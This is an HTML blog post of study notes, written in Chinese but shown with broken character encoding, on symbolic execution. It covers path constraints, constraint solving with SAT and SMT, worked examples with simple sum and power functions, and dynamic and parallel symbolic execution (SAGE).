<h1 id="0x00-åŸºæœ¬æ¨¡å‹"><a href="#0x00-åŸºæœ¬æ¨¡å‹" class="headerlink" title="0x00  åŸºæœ¬æ¨¡å‹"></a>0x00  åŸºæœ¬æ¨¡å‹</h1><ul>
<li><strong>æ¦‚è¿°</strong>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
è°ƒç”¨$sum(1,2)$ï¼Œå­¦è¿‡Cè¯­è¨€çš„éƒ½çŸ¥é“ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…<br>ä½†å¦‚æœæˆ‘è°ƒç”¨$sum(a1,a2)$ï¼Œå¹¶ä¸”æˆ‘åœ¨è¿™ä¹‹å‰å¹¶æœªå£°æ˜a1ï¼Œa2å‘¢ï¼Ÿ<br>å…ˆä¸è¦ç”¨Cè¯­è¨€çš„æ€è·¯æ¥è€ƒè™‘äº†ï¼Œæˆ‘ä»¬ç§°è¿™ç§æƒ…å†µä¸º<strong>ç¬¦å·æ‰§è¡Œ(Symbolic Execution)</strong>ï¼Œå…·ä½“ä¼šå‘ç”Ÿä»€ä¹ˆæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹  </li>
</ul>
<ul>
<li><p><strong>åŸºæœ¬æ€æƒ³</strong></p>
<ol>
<li>ä½¿ç”¨ç¬¦å·å˜é‡ä»£æ›¿å…·ä½“å€¼ä½œä¸ºç¨‹åºæˆ–å‡½æ•°çš„å‚æ•°ï¼Œå¹¶æ¨¡æ‹Ÿæ‰§è¡Œç¨‹åºä¸­çš„æŒ‡ä»¤ï¼Œå„æŒ‡ä»¤çš„æ“ä½œéƒ½åŸºäºç¬¦å·å˜é‡è¿›è¡Œï¼Œå…¶ä¸­æ“ä½œæ•°çš„å€¼ç”±ç¬¦å·å’Œå¸¸é‡ç»„æˆçš„è¡¨è¾¾å¼æ¥è¡¨ç¤º<ol>
<li>ç¬¦å·å˜é‡æ˜¯ä»€ä¹ˆï¼Ÿ<ol>
<li>è¯»è€…å¯ä»¥å°†ç¬¦å·æ‰§è¡Œè§†ä¸ºç¨‹åºå…·ä½“æ‰§è¡Œçš„è‡ªç„¶æ‰©å±•ï¼Œç¬¦å·å˜é‡ä½¿å¾—ç¨‹åºæ‰§è¡Œå˜å¾—ä¸ç¡®å®šï¼Œå½“æˆ‘ä»¬ç»™ä¸€ç³»åˆ—ç¬¦å·èµ‹ä¸€ä¸ªç¡®å®šçš„å€¼æ—¶ï¼Œç¬¦å·æ‰§è¡Œå°±æˆä¸ºäº†ç¨‹åºå…·ä½“æ‰§è¡Œï¼ˆi.e. ç¨‹åºçš„ä¸€æ¬¡å…·ä½“æ‰§è¡Œå¯ä»¥è§†ä¸ºç¬¦å·æ‰§è¡Œçš„ä¸€æ¬¡å®ä¾‹ï¼‰</li>
</ol>
</li>
<li>æ“ä½œæ•°æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ol>
</li>
<li>å¯¹äºä»»æ„ç¨‹åºï¼Œå…¶æ‰§è¡Œæµç¨‹æ˜¯ç”±æ‰§è¡Œåºåˆ—çš„æ‰§è¡Œè¯­ä¹‰æ§åˆ¶çš„<ol>
<li>æ‰§è¡Œè¯­ä¹‰ï¼š<ol>
<li>å˜é‡å®šä¹‰è¯­å¥å¯¹æ•°æ®å¯¹è±¡çš„æè¿° <code>int a;</code></li>
<li>å£°æ˜è¯­å¥å¯¹ç¨‹åºæ•°æ®å¯¹è±¡çš„ä¿®æ”¹ <code>a = 10;</code></li>
<li>æ¡ä»¶è¯­å¥å¯¹ç¨‹åºæ‰§è¡Œæµç¨‹çš„æ§åˆ¶</li>
</ol>
</li>
</ol>
</li>
<li>å½“ç¨‹åºçš„è¾“å…¥å‚æ•°ç¡®å®šæ—¶ï¼Œå…¶æŒ‡ä»¤åºåˆ—è¢«å›ºå®šï¼Œå› æ­¤ç¨‹åºæ‰§è¡Œè¯­ä¹‰å’Œæ§åˆ¶æµä¹Ÿè¢«å›ºå®š</li>
</ol>
</li>
<li><p><strong>ç¨‹åºè¯­è¨€å®šä¹‰</strong></p>
<ol>
<li>James C. Kingåœ¨æå‡ºç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„åŒæ—¶ï¼Œä¹Ÿä¸ºå…¶é™å®šäº†ç†æƒ³çš„é€‚ç”¨åœºæ™¯ï¼š<ol>
<li>ç†æƒ³æ¨¡å‹ä¸­ç¨‹åºåªå¤„ç†â€œæœ‰ç¬¦å·æ•´æ•°â€</li>
<li>ç¨‹åºâ€œæ‰§è¡Œæ•°â€è§„æ¨¡æœ‰é™</li>
<li>å¯ä»¥å¤„ç†ç¨‹åºå†…æ‰€æœ‰ifæ¡ä»¶è¯­å¥çš„çº¦æŸè¡¨è¾¾å¼</li>
</ol>
</li>
<li>åŸºäºç¬¦å·æ‰§è¡ŒæŠ€æœ¯çš„ç†æƒ³åœºæ™¯ï¼Œå¯¹ç¨‹åºè¯­è¨€åšå¦‚ä¸‹å®šä¹‰<ol>
<li>ç¨‹åºå˜é‡ç±»å‹ï¼šåªåŒ…å«â€œæœ‰ç¬¦å·æ•´æ•°â€</li>
<li>ç¨‹åºè¯­å¥ç±»å‹<ol>
<li>ç®€å•å£°æ˜è¯­å¥ï¼Œå¦‚<code>a = 3</code></li>
<li>ifæ¡ä»¶è¯­å¥(åŒ…æ‹¬then å’Œ else)</li>
<li>æ— æ¡ä»¶è·³è½¬è¯­å¥ï¼Œå¦‚gotoè¯­å¥</li>
<li>å˜é‡æ“ä½œè¯­å¥ï¼šå¦‚readå‡½æ•°ã€åŸºæœ¬æ•´æ•°è¿ç®—æ“ä½œï¼ˆ+ã€-ã€*ï¼‰</li>
</ol>
</li>
<li>ç¨‹åºè¯­ä¹‰<ol>
<li>ç®€å•å£°æ˜è¯­å¥ã€æ— æ¡ä»¶è·³è½¬è¯­å¥å’Œå˜é‡æ“ä½œè¯­å¥ï¼Œåªæ˜¯å°†ç¨‹åºä¸­çš„å…·ä½“å€¼æ›¿æ¢ä¸ºäº†ç¬¦å·</li>
<li>è€Œifæ¡ä»¶è¯­å¥ä¸­ï¼Œå°†å…·ä½“å€¼æ›¿æ¢ä¸ºäº†ç¬¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•åˆ¤æ–­ifè¯­å¥ä¸­çš„çœŸå€¼ï¼Œå°±ä¸èƒ½ç¡®å®šæ¡ä»¶åˆ†æ”¯çš„èµ°å‘ï¼Œè¿™æ˜¯ç¬¦å·æ‰§è¡ŒæŠ€æœ¯å¯¹ç¨‹åºæ‰§è¡Œè¯­ä¹‰çš„æœ€å¤§æ”¹å˜ï¼Œä¹Ÿæ˜¯ç¬¦å·æ‰§è¡Œä¸å…·ä½“æ‰§è¡Œçš„å…³é”®åŒºåˆ«</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p><strong>ç¨‹åºæ‰§è¡ŒçŠ¶æ€</strong></p>
<ul>
<li>PC<ol>
<li>ä¸ºäº†è§£å†³â€œåˆ†æ”¯èµ°å‘ä¸ç¡®å®šâ€çš„é—®é¢˜ï¼ŒKingä¸ºç¨‹åºçŠ¶æ€æ–°æ·»åŠ äº†ä¸€ä¸ªå˜é‡ï¼š<strong>è·¯å¾„çº¦æŸæ¡ä»¶ pc(path constraint)</strong>ï¼Œåœ¨æ¯ä¸ªifæ¡ä»¶è¯­å¥å¤„å¹¶æ²¡æœ‰å®é™…å†³å®šç¨‹åºæ‰§è¡Œå“ªä¸ªåˆ†æ”¯ï¼Œè¿™å°±éœ€è¦ç¬¦å·æ‰§è¡Œå¼•æ“<strong>ä¸»åŠ¨é€‰æ‹©æ‰§è¡Œåˆ†æ”¯</strong>å¹¶<strong>è®°å½•æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹</strong>ï¼Œpcå°±è¾…åŠ©å®Œæˆäº†è¿™é¡¹å·¥ä½œ</li>
<li>Simplyï¼Œpcå°±æ˜¯ç¬¦å·æ‰§è¡Œè¿‡ç¨‹ä¸­å¯¹è·¯å¾„ä¸Šæ¡ä»¶åˆ†æ”¯èµ°å‘çš„é€‰æ‹©æƒ…å†µ</li>
<li>æ¥çœ‹ä¸€æ®µç¤ºä¾‹<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>å‡è®¾ä¸Šè¿°ä¸‰ä¸ªåˆ†æ”¯ä¸­é€‰æ‹©äº†if1:true if2:true if3:falseï¼Œpcè¡¨ç¤ºä¸º<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>ï¼Œç”±æ­¤å¯è§ï¼Œpcæ˜¯ä¸€ä¸ªboolè¡¨è¾¾å¼</li>
</ol>
</li>
<li>ç¬¦å·æ‰§è¡Œå¼•æ“<ul>
<li>å½“ç¬¦å·æ‰§è¡Œåˆ° if(q) æ—¶ï¼Œpc æœ‰å¯èƒ½åŒ…å«qï¼ˆ1ï¼‰ï¼Œä¹Ÿå¯èƒ½åŒ…å« ~qï¼ˆ2ï¼‰ï¼Œå¦‚æœç¬¦å·æ‰§è¡Œå¼•æ“é€‰æ‹©è¿›å…¥thenåˆ†æ”¯ï¼Œåˆ™ pc è¡¨ç°ä¸ºï¼ˆ1ï¼‰çš„å½¢å¼ï¼Œå¦‚æœç¬¦å·æ‰§è¡Œå¼•æ“é€‰æ‹©è¿›å…¥elseåˆ†æ”¯ï¼Œ åˆ™ pc è¡¨ç°ä¸ºï¼ˆ2ï¼‰çš„å½¢å¼</li>
<li>è€Œæˆ‘ä»¬å¸Œæœ›ä¸¤æ¡åˆ†æ”¯éƒ½è¢«æµ‹è¯•ï¼Œæ‰€ä»¥ç¬¦å·æ‰§è¡Œå¼•æ“æ‰§è¡Œåˆ°ifæ¡ä»¶è¯­å¥æ—¶ï¼Œç¬¦å·æ‰§è¡Œéœ€è¦åˆ›å»ºä¸¤ä¸ªâ€œå¹¶è¡Œâ€çš„æ‰§è¡Œè¿‡ç¨‹</li>
<li>æ¯ä¸ªå’Œç¬¦å·å˜é‡ç›¸å…³çš„ifæ¡ä»¶è¯­å¥éƒ½ä¼šä¸ºpcè´¡çŒ®ä¸€ä¸ªå†³å®šç¨‹åºæ‰§è¡Œèµ°å‘çš„è¡¨è¾¾å¼ï¼Œæœ€åè¦ç¡®å®špcå¯¹åº”è·¯å¾„çš„ç¨‹åºè¾“å…¥å‚æ•°ï¼Œåªéœ€è¦ç”¨çº¦æŸæ±‚è§£å™¨å¯¹pcè¿›è¡Œæ±‚è§£</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>ç¬¦å·æ‰§è¡Œæ ‘</strong></p>
<ol>
<li>å®šä¹‰ï¼šç”¨æ¥æè¿°ç¨‹åºæ‰§è¡Œè·¯å¾„çš„æ ‘å½¢ç»“æ„</li>
<li>å†…å®¹ï¼šä¸€ä¸ªèŠ‚ç‚¹å¯¹åº”ç¨‹åºä¸­çš„ä¸€æ¡è¯­å¥ï¼Œè¿˜å¯ä»¥åŒ…å«æŒ‡ä»¤è®¡æ•°ã€PCã€å˜é‡å€¼ç­‰ç¨‹åºæ‰§è¡ŒçŠ¶æ€ä¿¡æ¯(æ²¡æ‰¾åˆ°åˆé€‚çš„å›¾ï¼Œå°±å…ˆæ”¾ä¸€å¼ ä¸å¸¦Cä»£ç çš„)<br><img src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></li>
</ol>
</li>
<li><p><strong>çº¦æŸæ±‚è§£</strong>   </p>
<ol>
<li>å®šä¹‰ï¼š  <ol>
<li>ç»™å®šä¸€ä¸ªä¸‰å…ƒç»„<V,D,C>,å…¶ä¸­ï¼š  <ol>
<li>V: å˜é‡çš„æœ‰é™é›†åˆ  </li>
<li>D: å˜é‡çš„è®ºåŸŸï¼Œå˜é‡å¯èƒ½å–å€¼çš„æœ‰é™é›†åˆ  </li>
<li>C: æœ‰é™çº¦æŸé›†åˆï¼ŒæŸä¸ªçº¦æŸå…³ç³»$C_i$åŒ…å«Vä¸­ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ï¼Œè‹¥$C_i$åŒ…å«kä¸ªå˜é‡ï¼Œåˆ™ç§°å…¶ä¸ºåœ¨è¿™kä¸ªå˜é‡é›†åˆä¸Šçš„kå…ƒçº¦æŸ  </li>
</ol>
</li>
<li>çº¦æŸæ±‚è§£å°±æ˜¯æ‰¾åˆ°çº¦æŸé—®é¢˜çš„ä¸€ä¸ªè§£ï¼Œè¯¥è§£å¯¹å˜é‡é›†åˆä¸­æ‰€æœ‰å˜é‡éƒ½èµ‹ä¸€ä¸ªå–è‡ªå…¶è®ºåŸŸçš„å€¼ï¼Œå¹¶ä¸”è¿™äº›å˜é‡çš„å€¼æ»¡è¶³è¯¥é—®é¢˜çš„æ‰€æœ‰çº¦æŸæ¡ä»¶  </li>
<li>å¯¹äºçº¦æŸé—®é¢˜$P = <V,D,C>$ï¼Œè‹¥Pè‡³å°‘å­˜åœ¨ä¸€ä¸ªè§£ï¼Œåˆ™ç§°Pä¸ºå¯æ»¡è¶³çš„ï¼Œå¦åˆ™ç§°å…¶ä¸ºä¸å¯æ»¡è¶³çš„  </li>
</ol>
</li>
<li>åˆ†ç±»:  <ol>
<li>SAT(The Satisfiability problem, å¯æ»¡è¶³æ€§é—®é¢˜)  <ol>
<li>å®šä¹‰ï¼šæ±‚è§£ç”±<strong>å¸ƒå°”å˜é‡é›†åˆ</strong>æ‰€æ„æˆçš„å¸ƒå°”å‡½æ•°ï¼Œæ˜¯å¦å­˜åœ¨å˜é‡çš„ä¸€ç§åˆ†å¸ƒä½¿å¾—è¯¥å‡½æ•°çš„å–å€¼ä¸º1  </li>
<li>ç¼ºé™·ï¼šâ‘ åªèƒ½è§£å†³å‘½é¢˜é€»è¾‘å…¬å¼é—®é¢˜ï¼Œå¾ˆå¤šå®é™…é—®é¢˜è½¬åŒ–ä¸æˆå‘½é¢˜é€»è¾‘é—®é¢˜â‘¡å¿…é¡»ç”¨å¸ƒå°”å˜é‡æ¥è¡¨ç¤ºï¼Œå°†å®é™…é—®é¢˜è½¬åŒ–ä¸ºå¸ƒå°”å‡½æ•°å¼€é”€å¤§ï¼Œè½¬æ¢åçš„å‡½æ•°ä¹Ÿæå…¶å¤æ‚  </li>
</ol>
</li>
<li>SMT(Satisfiability Modulo Theories, å¯æ»¡è¶³æ€§æ¨¡ç†è®º)    <ol>
<li>å®šä¹‰ï¼šå°†SATåªèƒ½æ±‚è§£å‘½é¢˜é€»è¾‘å…¬å¼é—®é¢˜æ‰©å±•ä¸ºå¯ä»¥è§£å†³ä¸€é˜¶é€»è¾‘æ‰€è¡¨è¾¾çš„å…¬å¼ã€‚åŒ…å«å¤šç§ç†è®ºã€‚<ol>
<li>ä»€ä¹ˆæ˜¯ä¸€é˜¶é€»è¾‘</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li><p><strong>å›åˆ°å¼€å§‹çš„å‡½æ•°</strong></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å°†å…¶å†™ä¸º<em>ç±»PL/1è¯­è¨€</em><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>æˆ‘ä»¬åœ¨è°ƒç”¨$sum(1,2)$åï¼Œå¯ä»¥åˆ—ä¸€ä¸ªè¡¨æ ¼æ¥è§‚å¯Ÿç¨‹åºæµ  </p>
<script type="math/tex; mode=display">
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line & X & Y & Z & A & B & pc \cr \hline
    1 & ? & ? & ? & 1 & 2 & true \cr \hline
    2 & 1 & ? & ? & 1 & 2 & true \cr \hline
    3 & 1 & 2 & ? & 1 & 2 & true \cr \hline
    4 & 1 & 2 & 3 & 1 & 2 & true \cr \hline
\end{array}</script><blockquote>
<p>Line 5æ˜¯return 3 (Katexä¸æ”¯æŒåˆå¹¶å•å…ƒæ ¼ï¼Œç†è§£ä¸‡å²)</p>
</blockquote>
<p>æˆ‘ä»¬åœ¨è°ƒç”¨$sum(a1,a2)$åï¼Œå°±æ˜¯æŠŠå…·ä½“å€¼æ¢æˆäº†å¯¹åº”çš„ç¬¦å· </p>
<script type="math/tex; mode=display">
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line & X & Y & Z & A & B & pc \cr \hline
    1 & ? & ? & ? & a1 & a2 & true \cr \hline
    2 & a1 & ? & ? & a1 & a2 & true \cr \hline
    3 & a1 & a2 & ? & a1 & a2 & true \cr \hline
    4 & a1 & a2 & a3 & a1 & a2 & true \cr \hline
\end{array}</script><blockquote>
<p>Line 5æ˜¯return (a1+a2)</p>
</blockquote>
<p>æ—¢ç„¶ç¬¦å·æ‰§è¡Œä¸å…·ä½“å€¼æ‰§è¡Œæœ€å¤§çš„åŒºåˆ«æ˜¯ifæ¡ä»¶è¯­å¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™ä¸€ä¸ªå¸¦æœ‰ifè¯­å¥çš„ç¨‹åºæ¥çœ‹ä¸€ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªå‡½æ•°è½¬åŒ–ä¸ºC++å°±æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int power(int X, int Y) &#123;</span><br><span class="line">    int Z = 1;</span><br><span class="line">    int J = 1;</span><br><span class="line">    while (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ç»§ç»­ç”¨è¡¨æ ¼çš„æ ¼å¼æ¥çœ‹</p>
<script type="math/tex; mode=display">
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line & Z & J & X & Y & pc \cr \hline
        1 & ? & ? & a1 & a2 & true \cr \hline
        2 & 1 & ? & a1 & a2 & true \cr \hline
        3 & 1 & 1 & a1 & a2 & true \cr \hline
\end{array}</script><p>å‰ä¸‰è¡Œéƒ½å¾ˆæ­£å¸¸ï¼Œç›´åˆ°ç¬¬äº”è¡Œè¿›è¡Œåˆ¤æ–­  </p>
<ol>
<li>å¤„ç†åˆ¤æ–­è¯­å¥ <code>Y&gt;=J</code> å¾—åˆ°çº¦æŸæ¡ä»¶ <code>a2&gt;=1</code></li>
<li>ç”Ÿæˆä¸¤ä¸ªåˆ†æ”¯çš„è·¯å¾„çº¦æŸæ¡ä»¶ï¼š  <ul>
<li>(a2&gt;=1) $\subset$ true</li>
<li>~(a2&gt;=1) $\subset$ true</li>
</ul>
</li>
<li>ä¸¤ä¸ªè·¯å¾„çº¦æŸéƒ½å¯æ»¡è¶³ï¼Œåˆ†åˆ«å¯¹ä¸¤ä¸ªè·¯å¾„è¿›è¡Œæ¢ç´¢</li>
</ol>
<p>å¯¹äºåˆ†æ”¯: ~(a2&gt;=1) $\subset$ true</p>
<script type="math/tex; mode=display">
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line & Z & J & X & Y & pc \cr \hline
        5 & 1 & 1 & a1 & a2 & ~(a2>=1) \cr \hline
\end{array}</script><p>ç„¶åé©¬ä¸Šåœ¨Line 12å¤„å¾—åˆ°(return 1 when a2&lt;1)ï¼Œæ¢ç´¢å®Œæˆ</p>
<p>å¯¹äºåˆ†æ”¯: (a2&gt;=1) $\subset$ true</p>
<script type="math/tex; mode=display">
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line & Z & J & X & Y & pc \cr \hline
        5 & 1 & 1 & a1 & a2 & (a2>=1) \cr \hline
        7 & a1 & 1 & a1 & a2 & (a2>=1) \cr \hline
        8 & a1 & 2 & a1 & a2 & (a2>=1) \cr \hline
\end{array}</script><p>ç„¶åå› ä¸ºLine 9ï¼Œç¨‹åºä¼šè·³å›ç¬¬å››è¡Œç»§ç»­åˆ¤æ–­è¯­å¥ï¼Œä¼šäº§ç”Ÿä¸¤ä¸ªæ–°çš„åˆ†æ”¯ï¼Œå°±é™·å…¥äº†æ— é™å¾ªç¯ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚</p>
<p>å¯æ˜¯å¾ªç¯åœ¨ä¸€ä¸ªç¨‹åºä¸­ç»å¸¸å‡ºç°ï¼Œè¯¥æ€ä¹ˆè§£å†³è¿™ä¸€é—®é¢˜ï¼Ÿæˆ‘ä»¬æ¥ç€å¾€åçœ‹</p>
<h1 id="0x01-åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯-DSE"><a href="#0x01-åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯-DSE" class="headerlink" title="0x01 åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯(DSE)"></a>0x01 åŠ¨æ€ç¬¦å·æ‰§è¡ŒæŠ€æœ¯(DSE)</h1><ul>
<li><p><strong>åŸºæœ¬æ€æƒ³</strong></p>
<ol>
<li>ä»¥å…·ä½“çš„æ•°å€¼ä½œä¸ºè¾“å…¥ï¼Œæ‰§è¡Œç¨‹åºä»£ç ï¼Œåœ¨ç¨‹åºå®é™…æ‰§è¡Œè·¯å¾„çš„åŸºç¡€ä¸Šï¼š<ol>
<li>ç”¨ç¬¦å·æ‰§è¡ŒæŠ€æœ¯å¯¹è·¯å¾„è¿›è¡Œåˆ†æ</li>
<li>æå–è·¯å¾„çš„çº¦æŸè¡¨è¾¾å¼</li>
<li>æ ¹æ®è·¯å¾„æœç´¢ç­–ç•¥(æ·±åº¦ã€å¹¿åº¦)å¯¹çº¦æŸè¡¨è¾¾å¼è¿›è¡Œå˜å½¢</li>
<li>æ±‚è§£å˜å½¢åçš„è¡¨è¾¾å¼å¹¶ç”Ÿæˆæ–°çš„æµ‹è¯•ç”¨ä¾‹</li>
<li>ä¸æ–­è¿­ä»£ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°å®Œå…¨éå†ç¨‹åºçš„æ‰€æœ‰æ‰§è¡Œè·¯å¾„</li>
</ol>
</li>
<li>DSEçš„å‡ºç°æ˜¯ä¸ºäº†è§£å†³é™æ€SEâ‘ æ‰§è¡Œæ•ˆç‡ä½â‘¡ç³»ç»Ÿå¼€é”€å¤§â‘¢è¯¯æŠ¥ç‡é«˜çš„é—®é¢˜</li>
</ol>
</li>
<li><p><strong>å®ç°ç»†èŠ‚(ä»¥å‡½æ•°ä¸ºä¾‹)</strong></p>
<ol>
<li>åœºæ™¯ï¼š<code>void func(int a,int b)</code>,è°ƒç”¨<code>func(X,Y)</code></li>
<li>Step1: ç”Ÿæˆä¸€ç»„éšæœºè¾“å…¥ï¼Œå¼€å§‹â€å®é™…æ‰§è¡Œâ€</li>
<li>Step2: <strong>åŒæ—¶</strong>ç¬¦å·å¼•æ“å¼€å§‹ç¬¦å·æ‰§è¡Œï¼ŒæŒ‰ç…§â€œå®é™…æ‰§è¡Œâ€çš„â€œæ‰§è¡Œè·¯å¾„â€ä¸Šçš„åˆ†æ”¯æ¡ä»¶è¯­å¥çš„â€œè°“è¯â€ï¼Œæœé›†æ‰€æœ‰ç¬¦å·çº¦æŸæ¡ä»¶åŠå…¶å¯¹åº”çœŸå€¼</li>
<li>Step3: æ ¹æ®æ”¶é›†åˆ°çš„ç¬¦å·çº¦æŸæ¡ä»¶ï¼ŒæŒ‰ç…§ä¸€å®šè·¯å¾„é€‰æ‹©ç­–ç•¥ï¼Œæ„é€ å‡ºä¸€æ¡æ–°çš„å¯è¡Œè·¯å¾„çº¦æŸ<ul>
<li>ä¸¾ä¸ªä¾‹å­ï¼šæ·±åº¦ä¼˜å…ˆç­–ç•¥</li>
<li>å¦‚æœ<code>pc = p1 âˆ© p2 âˆ© p3</code>, æ·±åº¦ä¼˜å…ˆå°±æ˜¯å°†æœ€åä¸€ä¸ªè°“è¯(å¯¹ä¸èµ·joå¤ªéƒğŸ˜­ç¦»æ•£æ²¡å­¦å¥½å¿˜äº†è¿™ä¸ªp3å«å•¥äº†)å–éï¼Œå˜ä¸º<code>p1 âˆ© p2 âˆ© ~p3</code></li>
</ul>
</li>
<li>Step4: ä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ±‚è§£å‡ºæ–°çº¦æŸé›†åˆå¯¹åº”çš„å…·ä½“è¾“å…¥</li>
<li>Step5: é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°éå†å…¨éƒ¨è·¯å¾„</li>
</ol>
</li>
<li><p><strong>DSEå·¥å…·SAGE</strong></p>
<ol>
<li>åŸç†ç²—ç•¥åœ°è¿‡äº†ä¸€éï¼Œå¤§æ®µå¤§æ®µçš„çœ‹ä¸æ‡‚ğŸ˜­è¿™é‡Œå°±ä¸èŠ±æ—¶é—´æ€»ç»“äº†</li>
<li>SAGEåŸºäºx86çš„æœºå™¨ç è¿›è¡Œç¬¦å·æ‰§è¡Œï¼ŒåŸå› å¦‚ä¸‹ï¼š<ol>
<li>å±è”½ä¸åŒç¼–ç¨‹è¯­è¨€ã€ç¼–è¯‘å™¨åŠç¼–è¯‘å¹³å°å¯¹åˆ†æè¿‡ç¨‹çš„å½±å“ï¼Œå…·æœ‰æ›´å¼ºçš„å¤ç”¨æ€§</li>
<li>å¿½ç•¥ç¼–è¯‘å™¨â€ä»£ç ä¼˜åŒ–â€â€ä»£ç æ··æ·†â€â€åŸºæœ¬å—è½¬æ¢â€ç­‰ä½¿ä»£ç è¯­ä¹‰å‘ç”Ÿå˜åŒ–çš„æ“ä½œï¼Œæœ‰åˆ©äºç¡®å®šç¨‹åºå®é™…å­˜åœ¨çš„æ¼æ´</li>
<li>é—­æºåˆ†æyyds</li>
</ol>
</li>
</ol>
</li>
<li><p><strong>å…³é”®é—®é¢˜</strong></p>
<ol>
<li>å¤–éƒ¨å‡½æ•°è°ƒç”¨</li>
<li>å¾ªç¯é—®é¢˜ï¼šè·¯å¾„çˆ†ç‚¸</li>
</ol>
</li>
</ul>
<blockquote>
<p>è¿™ä¸€æ®µä¹Ÿä¸ä»”ç»†è¯»äº†â€¦ç”¨åˆ°å†å­¦</p>
</blockquote>
<h1 id="0x02-å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯-PSE"><a href="#0x02-å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯-PSE" class="headerlink" title="0x02 å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯(PSE)"></a>0x02 <strong>å¹¶è¡Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯(PSE)</strong></h1><ul>
<li><strong>åŸºæœ¬æ€æƒ³</strong><ol>
<li>å¾ˆå¤šæƒ…å†µä¸‹ç¬¦å·æ‰§è¡Œå¼•æ“æ— æ³•ç»§ç»­è¿è¡Œçš„åŸå› æ˜¯å†…å­˜ä¸è¶³ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸Œæœ›é€šè¿‡è®¡ç®—é›†ç¾¤å¯æ— ç©·æ‰©å±•çš„å†…å­˜ç©ºé—´å’ŒCPUæ¥ç¼“è§£è·¯å¾„çˆ†ç‚¸é—®é¢˜</li>
<li>åˆ†å¸ƒå¼â€¦è¿™æˆ‘å°±å…ˆä¸çœ‹äº†</li>
</ol>
</li>
</ul>
<h1 id="0x03-å‚è€ƒæ–‡çŒ®"><a href="#0x03-å‚è€ƒæ–‡çŒ®" class="headerlink" title="0x03 å‚è€ƒæ–‡çŒ®"></a>0x03 å‚è€ƒæ–‡çŒ®</h1><p>1ã€Šè½¯ä»¶å®‰å…¨åˆ†æä¸åº”ç”¨ã€‹</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
</search>
